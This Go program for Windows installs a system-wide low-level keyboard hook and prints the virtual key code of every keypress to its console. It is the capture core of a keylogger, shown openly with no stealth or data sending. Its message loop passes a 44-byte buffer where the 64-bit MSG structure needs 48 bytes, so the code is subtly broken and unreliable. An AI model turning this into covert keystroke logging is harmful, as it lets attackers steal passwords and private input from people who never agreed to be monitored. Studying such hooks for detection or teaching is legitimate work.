package main

import (
	"fmt"
	"os"
	"os/signal"
	"syscall"
	"unsafe"
)

// Windows API constants
const (
	WH_KEYBOARD_LL = 13     // Low-level keyboard hook identifier
	WM_KEYDOWN     = 0x0100 // Window message for key press
)

// Windows Data Types defined for Go
type (
	HANDLE    uintptr
	HWND      HANDLE
	HINSTANCE HANDLE
	HHOOK     HANDLE
	WPARAM    uintptr
	LPARAM    uintptr
	LRESULT   uintptr
)

// KBDLLHOOKSTRUCT contains information about a low-level keyboard input event
type KBDLLHOOKSTRUCT struct {
	VkCode      uint32
	ScanCode    uint32
	Flags       uint32
	Time        uint32
	DwExtraInfo uintptr
}

var (
	user32                  = syscall.NewLazyDLL("user32.dll")
	procSetWindowsHookExW   = user32.NewProc("SetWindowsHookExW")
	procCallNextHookEx      = user32.NewProc("CallNextHookEx")
	procUnhookWindowsHookEx = user32.NewProc("UnhookWindowsHookEx")
	procGetMessageW         = user32.NewProc("GetMessageW")

	hhk HHOOK // Global variable to store our hook handle
)

// The callback function triggered on every keypress
func keyboardHookCallback(nCode int32, wParam WPARAM, lParam LPARAM) LRESULT {
	// nCode >= 0 means we must process the event; otherwise, pass it immediately
	if nCode >= 0 && wParam == WM_KEYDOWN {
		// Cast the lParam pointer to our Go-compatible keyboard struct
		kbd := (*KBDLLHOOKSTRUCT)(unsafe.Pointer(lParam))

		// Print the Virtual Key Code (e.g., 65 for 'A')
		fmt.Printf("[+] Key Pressed: VK Code %d\n", kbd.VkCode)
	}

	// Always pass the event to the next hook in the chain
	ret, _, _ := procCallNextHookEx.Call(uintptr(hhk), uintptr(nCode), uintptr(wParam), uintptr(lParam))
	return LRESULT(ret)
}

func main() {
	fmt.Println("[*] Setting up Global Low-Level Keyboard Hook...")

	// Convert our Go callback function into a generic uintptr compile-compatible callback
	callbackPtr := syscall.NewCallback(keyboardHookCallback)

	// Call SetWindowsHookExW
	// Arguments: Hook Type, Callback Pointer, Module Handle (0 for current), Thread ID (0 for global)
	ret, _, err := procSetWindowsHookExW.Call(
		WH_KEYBOARD_LL,
		callbackPtr,
		0,
		0,
	)

	if ret == 0 {
		fmt.Printf("[-] Failed to set hook. Error: %v\n", err)
		return
	}
	hhk = HHOOK(ret)
	fmt.Println("[+] Hook installed successfully. Press Ctrl+C in this console to exit.")

	// Handle graceful cleanup when exiting the terminal
	c := make(chan os.Signal, 1)
	signal.Notify(c, os.Interrupt)
	go func() {
		<-c
		fmt.Println("\n[*] Removing hook and exiting...")
		procUnhookWindowsHookEx.Call(uintptr(hhk))
		os.Exit(0)
	}()

	// Windows Message Loop - REQUIRED for low-level hooks to capture events
	var msg [11]uint32 // Basic buffer for tagMSG structure
	for {
		// GetMessage blocks until a system message is available
		ret, _, _ := procGetMessageW.Call(uintptr(unsafe.Pointer(&msg[0])), 0, 0, 0)
		if int32(ret) <= 0 {
			break
		}
	}
}
